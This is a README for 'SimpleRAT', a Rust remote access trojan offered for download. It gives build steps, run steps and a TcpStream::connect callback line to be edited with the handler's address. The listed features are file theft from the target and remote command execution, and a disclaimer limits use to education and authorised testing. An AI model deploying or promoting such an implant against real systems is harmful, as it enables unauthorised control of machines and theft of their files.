
# SimpleRAT

![SimpleRAT](https://img.shields.io/badge/SimpleRAT-v1.0-orange.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)

SimpleRAT is a basic Remote Access Trojan (RAT) written in Rust. It allows for remote control and file transfer capabilities, designed to be used in conjunction with the [ReverseShellHandler](https://github.com/Jirka5091/ReverseShellHandler).

## Features

- 📁 File transfer from target system to handler
- 📜 Execute system commands on the target machine
- 📡 Connects to ReverseShellHandler for managing sessions

## Installation

To build and run SimpleRAT, ensure you have Rust installed. Then, follow these steps:

```bash
git clone https://github.com/Jirka5091/SimpleRAT
cd SimpleRAT
# Edit the main.rs file to set the handler IP and port
nano src/main.rs
cargo build --release
```

In `main.rs`, set the handler IP and port:

```rust
let mut stream = TcpStream::connect("127.0.0.1:8080")
```

## Usage

To start the SimpleRAT, use the following command:

```bash
./target/release/simple_rat
```

## Integration with ReverseShellHandler

SimpleRAT is intended to be used with the [ReverseShellHandler](https://github.com/Jirka5091/ReverseShellHandler). Ensure the handler is running and listening on the specified IP and port before starting SimpleRAT.

## Disclaimer

This tool is intended for educational purposes and legitimate penetration testing only. Unauthorized use of this tool to compromise computer systems, networks, or any other systems without permission is illegal and unethical. The author is not responsible for any misuse of this tool.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Author

[crash_byte](https://github.com/Jirka5091)
